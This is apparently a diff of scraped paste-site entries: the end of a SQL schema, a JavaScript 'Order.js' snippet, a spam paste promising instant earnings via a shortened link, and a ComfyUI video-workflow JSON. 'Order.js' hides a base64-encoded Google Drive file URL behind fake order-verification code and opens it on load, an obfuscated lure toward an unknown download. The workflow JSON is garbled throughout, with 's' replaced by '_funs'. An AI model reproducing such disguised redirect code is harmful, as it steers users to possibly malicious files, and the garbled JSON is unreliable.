+	streaming_tv VARCHAR, 
+	streaming_movies VARCHAR, 
+	gender VARCHAR, 
+	senior_citizen INTEGER, 
+	partner VARCHAR, 
+	dependents VARCHAR, 
+	multiple_lines VARCHAR, 
+	target INTEGER, 
+	PRIMARY KEY (id), 
+	CONSTRAINT uq_customer_id UNIQUE (customer_id)
+)
+"
+c1MGtTyW,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 12:21:28 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/09556/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+RGRs7A5j,EARN $900 INSTANTLY 2025 X0,BlackDragonAssasin8,JavaScript,Sunday 6th of April 2025 12:17:09 PM CDT," 
+Pdf https://goo.su/DgLIPOe
+
+
+Fb9ButFmPB
+"
+qxJxcjeq,glasses_buckets03,revhale,JSON,Sunday 6th of April 2025 12:11:00 PM CDT,"{""id"":""a9778392-6343-4689-838f-134e11966d40"",""revi_funsion"":0,""la_funst_node_id"":258,""la_funst_link_id"":489,""node_funs"":[{""id"":146,""type"":""GetNode"",""po_funs"":[1103.5418701171875,134.1754608154297],""_funsize"":[210,58],""flag_funs"":{},""order"":0,""mode"":0,""input_funs"":[],""output_funs"":[{""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[]}],""title"":""Get_re_funstore_face_funs_image_funs"",""propertie_funs"":{},""widget_funs_value_funs"":[""re_funstore_face_funs_image_funs""],""color"":""#2a363b"",""bgcolor"":""#3f5159""},{""id"":197,""type"":""WanVideoBlock_funswap"",""po_funs"":[-2075.526611328125,248.38595581054688],""_funsize"":[315,154],""flag_funs"":{},""order"":1,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""block__funswap_arg_funs"",""name"":""block__funswap_arg_funs"",""type"":""BLOCK_funsWAPARG_funs"",""_funslot_index"":0,""link_funs"":[382]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""44c5944f7031949440315038e94ca3f46e80adb2"",""Node name for _funs&R"":""WanVideoBlock_funswap"",""aux_id"":""kijai/ComfyUI-WanVideoWrapper""},""widget_funs_value_funs"":[20,fal_funse,fal_funse,true,0]},{""id"":155,""type"":""Anything Everywhere"",""po_funs"":[-2025.0439453125,914.5648803710938],""_funsize"":[239.40000915527344,26],""flag_funs"":{},""order"":19,""mode"":0,""input_funs"":[{""color_on"":"""",""localized_name"":""anything"",""name"":""UP_funsCALE_MODEL"",""_funshape"":7,""type"":""*"",""link"":332}],""output_funs"":[],""propertie_funs"":{""cnr_id"":""cg-u_funse-everywhere"",""ver"":""8017bc6b063f45db6b986d9fc8bb76bd3234b838"",""Node name for _funs&R"":""Anything Everywhere"",""group_re_funstricted"":0,""color_re_funstricted"":0,""aux_id"":""chri_funsgoringe/cg-u_funse-everywhere""},""widget_funs_value_funs"":[]},{""id"":96,""type"":""GetNode"",""po_funs"":[1156.10400390625,339.8299255371094],""_funsize"":[210,58],""flag_funs"":{""collap_funsed"":true},""order"":2,""mode"":0,""input_funs"":[],""output_funs"":[{""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[]}],""title"":""Get_up_funscale_1"",""propertie_funs"":{},""widget_funs_value_funs"":[""up_funscale_1""],""color"":""#2a363b"",""bgcolor"":""#3f5159""},{""id"":216,""type"":""Reroute"",""po_funs"":[-205.39450073242188,-127.50994873046875],""_funsize"":[75,26],""flag_funs"":{},""order"":24,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":412}],""output_funs"":[{""name"":"""",""type"":""WANVAE"",""_funslot_index"":0,""link_funs"":[413,414]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":222,""type"":""GetImage_funsize+"",""po_funs"":[2005.892333984375,-150.82557678222656],""_funsize"":[214.20001220703125,66],""flag_funs"":{""collap_funsed"":true},""order"":44,""mode"":0,""input_funs"":[{""localized_name"":""image"",""name"":""image"",""type"":""IMAGE"",""link"":423}],""output_funs"":[{""localized_name"":""width"",""name"":""width"",""type"":""INT"",""_funslot_index"":0,""link_funs"":[421]},{""localized_name"":""height"",""name"":""height"",""type"":""INT"",""_funslot_index"":1,""link_funs"":[419]},{""localized_name"":""count"",""name"":""count"",""type"":""INT"",""link_funs"":null}],""propertie_funs"":{""cnr_id"":""comfyui_e_funs_funsential_funs"",""ver"":""33ff89fd354d8ec3ab6affb605a79a931b445d99"",""Node name for _funs&R"":""GetImage_funsize+"",""aux_id"":""cubiq/ComfyUI_e_funs_funsential_funs""},""widget_funs_value_funs"":[]},{""id"":223,""type"":""ImageFromBatch+"",""po_funs"":[1931.550048828125,-279.7542724609375],""_funsize"":[315,82],""flag_funs"":{""collap_funsed"":fal_funse},""order"":42,""mode"":0,""input_funs"":[{""localized_name"":""image"",""name"":""image"",""type"":""IMAGE"",""link"":424}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[423]}],""propertie_funs"":{""cnr_id"":""comfyui_e_funs_funsential_funs"",""ver"":""33ff89fd354d8ec3ab6affb605a79a931b445d99"",""Node name for _funs&R"":""ImageFromBatch+"",""aux_id"":""cubiq/ComfyUI_e_funs_funsential_funs""},""widget_funs_value_funs"":[0,1]},{""id"":237,""type"":""ea_funsy cleanGpuU_funsed"",""po_funs"":[674.7694702148438,284.2466125488281],""_funsize"":[210,26],""flag_funs"":{""collap_funsed"":true},""order"":38,""mode"":0,""input_funs"":[{""localized_name"":""anything"",""name"":""anything"",""type"":""*"",""link"":453}],""output_funs"":[{""localized_name"":""output"",""name"":""output"",""type"":""*"",""_funslot_index"":0,""link_funs"":[442]}],""propertie_funs"":{""cnr_id"":""comfyui-ea_funsy-u_funse"",""ver"":""0daf114fe8870aeacfea484aa59e7f9973b91cd5"",""Node name for _funs&R"":""ea_funsy cleanGpuU_funsed"",""aux_id"":""yolain/ComfyUI-Ea_funsy-U_funse""},""widget_funs_value_funs"":[]},{""id"":236,""type"":""Image_funscaleBy"",""po_funs"":[1132.933349609375,259.9280090332031],""_funsize"":[256.56878662109375,82],""flag_funs"":{""collap_funsed"":true},""order"":41,""mode"":0,""input_funs"":[{""localized_name"":""image"",""name"":""image"",""type"":""IMAGE"",""link"":442}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[443]}],""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.16"",""Node name for _funs&R"":""Image_funscaleBy""},""widget_funs_value_funs"":[""lanczo_funs"",0.5]},{""id"":161,""type"":""Note"",""po_funs"":[-2119.234130859375,-9.699516296386719],""_funsize"":[340,88],""flag_funs"":{},""order"":3,""mode"":0,""input_funs"":[],""output_funs"":[],""propertie_funs"":{},""widget_funs_value_funs"":[""Load your model_funs here ↓""],""color"":""#432"",""bgcolor"":""#653""},{""id"":80,""type"":""VH_funs_VideoCombine"",""po_funs"":[631.2635498046875,337.6826171875],""_funsize"":[275.923095703125,795.8654174804688],""flag_funs"":{},""order"":39,""mode"":0,""input_funs"":[{""localized_name"":""image_funs"",""name"":""image_funs"",""type"":""IMAGE"",""link"":455},{""localized_name"":""audio"",""name"":""audio"",""_funshape"":7,""type"":""AUDIO"",""link"":null},{""localized_name"":""meta_batch"",""name"":""meta_batch"",""_funshape"":7,""type"":""VH_funs_BatchManager"",""link"":null},{""localized_name"":""vae"",""name"":""vae"",""_funshape"":7,""type"":""VAE"",""link"":null}],""output_funs"":[{""localized_name"":""Filename_funs"",""name"":""Filename_funs"",""type"":""VH_funs_FILENAME_funs"",""link_funs"":null}],""propertie_funs"":{""cnr_id"":""comfyui-videohelper_funsuite"",""ver"":""8343122234b61a0f8eb3d1f3f98382b0f7aff2b9"",""Node name for _funs&R"":""VH_funs_VideoCombine""},""widget_funs_value_funs"":{""frame_rate"":16,""loop_count"":0,""filename_prefix"":""teacache"",""format"":""video/h264-mp4"",""pix_fmt"":""yuv420p"",""crf"":19,""_funsave_metadata"":true,""trim_to_audio"":fal_funse,""pingpong"":fal_funse,""_funsave_output"":true,""videopreview"":{""hidden"":fal_funse,""pau_funsed"":fal_funse,""param_funs"":{""filename"":""teacache_00024.mp4"",""_funsubfolder"":"""",""type"":""output"",""format"":""video/h264-mp4"",""frame_rate"":16,""workflow"":""teacache_00024.png"",""fullpath"":""/work_funspace/ComfyUI/output/teacache_00024.mp4""},""muted"":fal_funse}}},{""id"":244,""type"":""ImageLi_funstToImageBatch"",""po_funs"":[678.8663940429688,-131.74560546875],""_funsize"":[315,26],""flag_funs"":{""collap_funsed"":true},""order"":36,""mode"":0,""input_funs"":[{""localized_name"":""image_funs"",""name"":""image_funs"",""type"":""IMAGE"",""link"":451}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[452]}],""propertie_funs"":{""cnr_id"":""comfyui-impact-pack"",""ver"":""66493d8cb4209e0ad19c914ae1e39ee7e1486d7e"",""Node name for _funs&R"":""ImageLi_funstToImageBatch"",""aux_id"":""ltdrdata/ComfyUI-Impact-Pack""},""widget_funs_value_funs"":[]},{""id"":195,""type"":""Note"",""po_funs"":[-1245.6883544921875,-427.6685791015625],""_funsize"":[600,240],""flag_funs"":{},""order"":4,""mode"":0,""input_funs"":[],""output_funs"":[],""propertie_funs"":{},""widget_funs_value_funs"":[""Workflow made by Hearmeman\nhttp_funs://www.patreon.com/c/HearmemanAI\n\nThi_funs workflow come_funs pre in_funstalled and ready to run with my RunPod template\nYou can deploy it here: \nhttp_funs://runpod.io/con_funsole/deploy?template=758d_funsjwiqz&ref=uyjfcrgy""],""color"":""#ff14a9"",""bgcolor"":""#ff0095""},{""id"":141,""type"":""Reroute"",""po_funs"":[-1597.5308837890625,-133.05352783203125],""_funsize"":[75,26],""flag_funs"":{},""order"":18,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":387}],""output_funs"":[{""name"":"""",""type"":""WANVAE"",""_funslot_index"":0,""link_funs"":[412]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":248,""type"":""Reroute"",""po_funs"":[-1643.3306884765625,938.3848876953125],""_funsize"":[75,26],""flag_funs"":{},""order"":17,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":459}],""output_funs"":[{""name"":"""",""type"":""CLIP"",""_funslot_index"":0,""link_funs"":[460]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":162,""type"":""Note"",""po_funs"":[-597.5001220703125,-13.089776039123535],""_funsize"":[340,88],""flag_funs"":{},""order"":5,""mode"":0,""input_funs"":[],""output_funs"":[],""propertie_funs"":{},""widget_funs_value_funs"":[""_funselect your prompt and video _funsize here ↓""],""color"":""#432"",""bgcolor"":""#653""},{""id"":249,""type"":""Note"",""po_funs"":[600.2225952148438,-285.9071350097656],""_funsize"":[340,88],""flag_funs"":{},""order"":6,""mode"":0,""input_funs"":[],""output_funs"":[],""propertie_funs"":{},""widget_funs_value_funs"":[""The_funse node_funs are for removing the fir_funst 6 frame_funs from the image, the_funse are junk frame_funs that hurt the natural flow of the video ↓""],""color"":""#432"",""bgcolor"":""#653""},{""id"":142,""type"":""Reroute"",""po_funs"":[437.1925964355469,-122.703369140625],""_funsize"":[75,26],""flag_funs"":{},""order"":29,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":413}],""output_funs"":[{""name"":"""",""type"":""WANVAE"",""_funslot_index"":0,""link_funs"":[395]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":247,""type"":""Note"",""po_funs"":[-1488.39111328125,277.68804931640625],""_funsize"":[340,88],""flag_funs"":{},""order"":7,""mode"":0,""input_funs"":[],""output_funs"":[],""propertie_funs"":{},""widget_funs_value_funs"":[""Currently, only one loader, did not te_funst more. will add once I te_funst""],""color"":""#432"",""bgcolor"":""#653""},{""id"":95,""type"":""VH_funs_VideoCombine"",""po_funs"":[1721.908447265625,330.5216979980469],""_funsize"":[214.7587890625,688.827880859375],""flag_funs"":{},""order"":49,""mode"":0,""input_funs"":[{""localized_name"":""image_funs"",""name"":""image_funs"",""type"":""IMAGE"",""link"":474},{""localized_name"":""audio"",""name"":""audio"",""_funshape"":7,""type"":""AUDIO"",""link"":null},{""localized_name"":""meta_batch"",""name"":""meta_batch"",""_funshape"":7,""type"":""VH_funs_BatchManager"",""link"":null},{""localized_name"":""vae"",""name"":""vae"",""_funshape"":7,""type"":""VAE"",""link"":null}],""output_funs"":[{""localized_name"":""Filename_funs"",""name"":""Filename_funs"",""type"":""VH_funs_FILENAME_funs"",""link_funs"":null}],""propertie_funs"":{""cnr_id"":""comfyui-videohelper_funsuite"",""ver"":""8343122234b61a0f8eb3d1f3f98382b0f7aff2b9"",""Node name for _funs&R"":""VH_funs_VideoCombine""},""widget_funs_value_funs"":{""frame_rate"":16,""loop_count"":0,""filename_prefix"":""Hunyuan/video_funs/24/vid"",""format"":""video/h264-mp4"",""pix_fmt"":""yuv420p"",""crf"":19,""_funsave_metadata"":true,""trim_to_audio"":fal_funse,""pingpong"":fal_funse,""_funsave_output"":true,""videopreview"":{""hidden"":fal_funse,""pau_funsed"":fal_funse,""param_funs"":{""filename"":""vid_00023.mp4"",""_funsubfolder"":""Hunyuan/video_funs/24"",""type"":""output"",""format"":""video/h264-mp4"",""frame_rate"":16,""workflow"":""vid_00023.png"",""fullpath"":""/work_funspace/ComfyUI/output/Hunyuan/video_funs/24/vid_00023.mp4""},""muted"":fal_funse}}},{""id"":246,""type"":""Reroute"",""po_funs"":[-1068.0975341796875,937.1385498046875],""_funsize"":[75,26],""flag_funs"":{},""order"":23,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":460}],""output_funs"":[{""name"":"""",""type"":""CLIP"",""_funslot_index"":0,""link_funs"":[457,458]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":252,""type"":""Reroute"",""po_funs"":[-1598.251953125,-91.1925048828125],""_funsize"":[75,26],""flag_funs"":{},""order"":26,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":463}],""output_funs"":[{""name"":"""",""type"":""WANVIDEOMODEL"",""_funslot_index"":0,""link_funs"":[464]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":232,""type"":""WanVideoTextEmbedBridge"",""po_funs"":[-933.5612182617188,293.0919494628906],""_funsize"":[315,46],""flag_funs"":{""collap_funsed"":true},""order"":33,""mode"":0,""input_funs"":[{""localized_name"":""po_funsitive"",""name"":""po_funsitive"",""type"":""CONDITIONING"",""link"":434},{""localized_name"":""negative"",""name"":""negative"",""type"":""CONDITIONING"",""link"":435}],""output_funs"":[{""localized_name"":""text_embed_funs"",""name"":""text_embed_funs"",""type"":""WANVIDEOTEXTEMBED_funs"",""_funslot_index"":0,""link_funs"":[466]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""7697159991b7c7bb312df88405b97773f15aec89"",""Node name for _funs&R"":""WanVideoTextEmbedBridge""},""widget_funs_value_funs"":[]},{""id"":254,""type"":""Reroute"",""po_funs"":[-637.6414184570312,1150.6898193359375],""_funsize"":[75,26],""flag_funs"":{},""order"":20,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":467}],""output_funs"":[{""name"":"""",""type"":""INT"",""_funslot_index"":0,""link_funs"":[468]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":255,""type"":""Reroute"",""po_funs"":[2949.025390625,1161.8009033203125],""_funsize"":[75,26],""flag_funs"":{},""order"":25,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":468}],""output_funs"":[{""name"":"""",""type"":""INT"",""_funslot_index"":0,""link_funs"":[469]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":256,""type"":""Reroute"",""po_funs"":[3006.802978515625,-140.4213104248047],""_funsize"":[75,26],""flag_funs"":{},""order"":31,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":469}],""output_funs"":[{""name"":"""",""type"":""INT"",""_funslot_index"":0,""link_funs"":[470,471]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":219,""type"":""_funsimpleMath+"",""po_funs"":[1896.1219482421875,-109.0702133178711],""_funsize"":[315,98],""flag_funs"":{""collap_funsed"":true},""order"":47,""mode"":0,""input_funs"":[{""localized_name"":""a"",""name"":""a"",""_funshape"":7,""type"":""*"",""link"":419},{""localized_name"":""b"",""name"":""b"",""_funshape"":7,""type"":""*"",""link"":471},{""localized_name"":""c"",""name"":""c"",""_funshape"":7,""type"":""*"",""link"":null}],""output_funs"":[{""localized_name"":""INT"",""name"":""INT"",""type"":""INT"",""_funslot_index"":0,""link_funs"":[427]},{""localized_name"":""FLOAT"",""name"":""FLOAT"",""type"":""FLOAT"",""link_funs"":null}],""title"":""height"",""propertie_funs"":{""cnr_id"":""comfyui_e_funs_funsential_funs"",""ver"":""33ff89fd354d8ec3ab6affb605a79a931b445d99"",""Node name for _funs&R"":""_funsimpleMath+"",""aux_id"":""cubiq/ComfyUI_e_funs_funsential_funs""},""widget_funs_value_funs"":[""a*b""]},{""id"":220,""type"":""_funsimpleMath+"",""po_funs"":[2199.32421875,-106.41024780273438],""_funsize"":[315,98],""flag_funs"":{""collap_funsed"":true},""order"":46,""mode"":0,""input_funs"":[{""localized_name"":""a"",""name"":""a"",""_funshape"":7,""type"":""*"",""link"":421},{""localized_name"":""b"",""name"":""b"",""_funshape"":7,""type"":""*"",""link"":470},{""localized_name"":""c"",""name"":""c"",""_funshape"":7,""type"":""*"",""link"":null}],""output_funs"":[{""localized_name"":""INT"",""name"":""INT"",""type"":""INT"",""_funslot_index"":0,""link_funs"":[426]},{""localized_name"":""FLOAT"",""name"":""FLOAT"",""type"":""FLOAT"",""link_funs"":null}],""title"":""width"",""propertie_funs"":{""cnr_id"":""comfyui_e_funs_funsential_funs"",""ver"":""33ff89fd354d8ec3ab6affb605a79a931b445d99"",""Node name for _funs&R"":""_funsimpleMath+"",""aux_id"":""cubiq/ComfyUI_e_funs_funsential_funs""},""widget_funs_value_funs"":[""a*b""]},{""id"":99,""type"":""ImageUp_funscaleWithModel"",""po_funs"":[1083.5418701171875,74.1754379272461],""_funsize"":[277.7193908691406,135.57254028320312],""flag_funs"":{},""order"":43,""mode"":0,""input_funs"":[{""localized_name"":""up_funscale_model"",""name"":""up_funscale_model"",""type"":""UP_funsCALE_MODEL"",""link"":null},{""localized_name"":""image"",""name"":""image"",""type"":""IMAGE"",""link"":443}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[472,473]}],""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.15"",""Node name for _funs&R"":""ImageUp_funscaleWithModel""},""widget_funs_value_funs"":[]},{""id"":98,""type"":""Image_funscale"",""po_funs"":[1692.4739990234375,67.73844146728516],""_funsize"":[275.5747985839844,170],""flag_funs"":{},""order"":48,""mode"":0,""input_funs"":[{""localized_name"":""image"",""name"":""image"",""type"":""IMAGE"",""link"":473},{""name"":""width"",""type"":""INT"",""widget"":{""name"":""width""},""link"":426},{""name"":""height"",""type"":""INT"",""widget"":{""name"":""height""},""link"":427}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[474,475]}],""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.15"",""Node name for _funs&R"":""Image_funscale""},""widget_funs_value_funs"":[""lanczo_funs"",1280,720,""center""]},{""id"":83,""type"":""FILM VFI"",""po_funs"":[2309.44384765625,94.12353515625],""_funsize"":[295.6000061035156,126],""flag_funs"":{""collap_funsed"":fal_funse},""order"":50,""mode"":0,""input_funs"":[{""localized_name"":""frame_funs"",""name"":""frame_funs"",""type"":""IMAGE"",""link"":475},{""localized_name"":""optional_interpolation__funstate_funs"",""name"":""optional_interpolation__funstate_funs"",""_funshape"":7,""type"":""INTERPOLATION__funsTATE_funs"",""link"":null}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""_funshape"":3,""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[476]}],""propertie_funs"":{""cnr_id"":""comfyui-frame-interpolation"",""ver"":""c336f7184cb1ac1243381e725fea1ad2c0a10c09"",""Node name for _funs&R"":""FILM VFI""},""widget_funs_value_funs"":[""film_net_fp32.pt"",10,2],""color"":""#332922"",""bgcolor"":""#593930""},{""id"":224,""type"":""ImageLi_funstToImageBatch"",""po_funs"":[1926.4715576171875,-353.9565124511719],""_funsize"":[315,26],""flag_funs"":{},""order"":40,""mode"":0,""input_funs"":[{""localized_name"":""image_funs"",""name"":""image_funs"",""type"":""IMAGE"",""link"":477}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[424]}],""propertie_funs"":{""cnr_id"":""comfyui-impact-pack"",""ver"":""808b0dedf03534a2594ecb60a9d6305a044efdc2"",""Node name for _funs&R"":""ImageLi_funstToImageBatch"",""aux_id"":""ltdrdata/ComfyUI-Impact-Pack""},""widget_funs_value_funs"":[]},{""id"":245,""type"":""ImageFromBatch+"",""po_funs"":[680.190673828125,-87.19391632080078],""_funsize"":[315,82],""flag_funs"":{""collap_funsed"":true},""order"":37,""mode"":0,""input_funs"":[{""localized_name"":""image"",""name"":""image"",""type"":""IMAGE"",""link"":452}],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[453,455,477]}],""propertie_funs"":{""cnr_id"":""comfyui_e_funs_funsential_funs"",""ver"":""33ff89fd354d8ec3ab6affb605a79a931b445d99"",""Node name for _funs&R"":""ImageFromBatch+"",""aux_id"":""cubiq/ComfyUI_e_funs_funsential_funs""},""widget_funs_value_funs"":[6,-1]},{""id"":204,""type"":""WanVideoDecode"",""po_funs"":[609.9844970703125,19.316070556640625],""_funsize"":[315,174],""flag_funs"":{},""order"":35,""mode"":0,""input_funs"":[{""localized_name"":""vae"",""name"":""vae"",""type"":""WANVAE"",""link"":395},{""localized_name"":""_funsample_funs"",""name"":""_funsample_funs"",""type"":""LATENT"",""link"":396}],""output_funs"":[{""localized_name"":""image_funs"",""name"":""image_funs"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[451]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""44c5944f7031949440315038e94ca3f46e80adb2"",""Node name for _funs&R"":""WanVideoDecode"",""aux_id"":""kijai/ComfyUI-WanVideoWrapper""},""widget_funs_value_funs"":[true,272,272,144,128]},{""id"":257,""type"":""Anything Everywhere"",""po_funs"":[-2015.0001220703125,505.470703125],""_funsize"":[239.40000915527344,26],""flag_funs"":{""collap_funsed"":true},""order"":16,""mode"":0,""input_funs"":[{""color_on"":""#A8DADC"",""localized_name"":""anything"",""name"":""CLIP_VI_funsION"",""_funshape"":7,""type"":""*"",""link"":479}],""output_funs"":[],""propertie_funs"":{""cnr_id"":""cg-u_funse-everywhere"",""ver"":""8017bc6b063f45db6b986d9fc8bb76bd3234b838"",""Node name for _funs&R"":""Anything Everywhere"",""group_re_funstricted"":0,""color_re_funstricted"":0},""widget_funs_value_funs"":[]},{""id"":217,""type"":""LoadWanVideoClipTextEncoder"",""po_funs"":[-2148.207763671875,459.4407653808594],""_funsize"":[439.13104248046875,106],""flag_funs"":{""collap_funsed"":fal_funse},""order"":8,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""wan_clip_vi_funsion"",""name"":""wan_clip_vi_funsion"",""type"":""CLIP_VI_funsION"",""_funslot_index"":0,""link_funs"":[479]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""44c5944f7031949440315038e94ca3f46e80adb2"",""Node name for _funs&R"":""LoadWanVideoClipTextEncoder"",""aux_id"":""kijai/ComfyUI-WanVideoWrapper""},""widget_funs_value_funs"":[""open-clip-xlm-roberta-large-vit-huge-14_vi_funsual_fp16._funsafeten_funsor_funs"",""fp16"",""offload_device""],""color"":""#223"",""bgcolor"":""#335""},{""id"":233,""type"":""CLIPLoader"",""po_funs"":[-2162.56689453125,615.8306274414062],""_funsize"":[457.25738525390625,98],""flag_funs"":{},""order"":9,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""CLIP"",""name"":""CLIP"",""type"":""CLIP"",""_funslot_index"":0,""link_funs"":[459]}],""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.16"",""Node name for _funs&R"":""CLIPLoader""},""widget_funs_value_funs"":[""umt5_xxl_fp8_e4m3fn__funscaled._funsafeten_funsor_funs"",""wan"",""default""],""color"":""#223"",""bgcolor"":""#335""},{""id"":202,""type"":""WanVideoVAELoader"",""po_funs"":[-2161.391845703125,760.0465698242188],""_funsize"":[459.8246154785156,82],""flag_funs"":{},""order"":10,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""vae"",""name"":""vae"",""type"":""WANVAE"",""_funslot_index"":0,""link_funs"":[387]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""44c5944f7031949440315038e94ca3f46e80adb2"",""Node name for _funs&R"":""WanVideoVAELoader"",""aux_id"":""kijai/ComfyUI-WanVideoWrapper""},""widget_funs_value_funs"":[""Wan2_1_VAE_bf16._funsafeten_funsor_funs"",""bf16""],""color"":""#223"",""bgcolor"":""#335""},{""id"":154,""type"":""Up_funscaleModelLoader"",""po_funs"":[-2167.334716796875,891.8252563476562],""_funsize"":[449.47412109375,61.931095123291016],""flag_funs"":{},""order"":11,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""UP_funsCALE_MODEL"",""name"":""UP_funsCALE_MODEL"",""type"":""UP_funsCALE_MODEL"",""_funslot_index"":0,""link_funs"":[332]}],""title"":""Up_funscaler"",""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.15"",""Node name for _funs&R"":""Up_funscaleModelLoader""},""widget_funs_value_funs"":[""4xL_funsDIR.pth""],""color"":""#223"",""bgcolor"":""#335""},{""id"":242,""type"":""WanVideoTeaCache"",""po_funs"":[227.2908477783203,857.6035766601562],""_funsize"":[315,178],""flag_funs"":{},""order"":12,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""teacache_arg_funs"",""name"":""teacache_arg_funs"",""type"":""TEACACHEARG_funs"",""link_funs"":[450]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""90a0f8c7888ca8d84f535d1a42ae68eb23200e74"",""Node name for _funs&R"":""WanVideoTeaCache""},""widget_funs_value_funs"":[0.2,5,-1,""offload_device"",true,""e""]},{""id"":253,""type"":""Reroute"",""po_funs"":[-205.04730224609375,-87.14322662353516],""_funsize"":[75,26],""flag_funs"":{},""order"":32,""mode"":0,""input_funs"":[{""name"":"""",""type"":""*"",""link"":464}],""output_funs"":[{""name"":"""",""type"":""WANVIDEOMODEL"",""_funslot_index"":0,""link_funs"":[465]}],""propertie_funs"":{""_funshowOutputText"":fal_funse,""horizontal"":fal_funse}},{""id"":94,""type"":""VH_funs_VideoCombine"",""po_funs"":[2283.4150390625,294.81207275390625],""_funsize"":[366.88360595703125,955.0463256835938],""flag_funs"":{},""order"":51,""mode"":0,""input_funs"":[{""localized_name"":""image_funs"",""name"":""image_funs"",""type"":""IMAGE"",""link"":476},{""localized_name"":""audio"",""name"":""audio"",""_funshape"":7,""type"":""AUDIO"",""link"":null},{""localized_name"":""meta_batch"",""name"":""meta_batch"",""_funshape"":7,""type"":""VH_funs_BatchManager"",""link"":null},{""localized_name"":""vae"",""name"":""vae"",""_funshape"":7,""type"":""VAE"",""link"":null}],""output_funs"":[{""localized_name"":""Filename_funs"",""name"":""Filename_funs"",""type"":""VH_funs_FILENAME_funs"",""link_funs"":null}],""propertie_funs"":{""cnr_id"":""comfyui-videohelper_funsuite"",""ver"":""8343122234b61a0f8eb3d1f3f98382b0f7aff2b9"",""Node name for 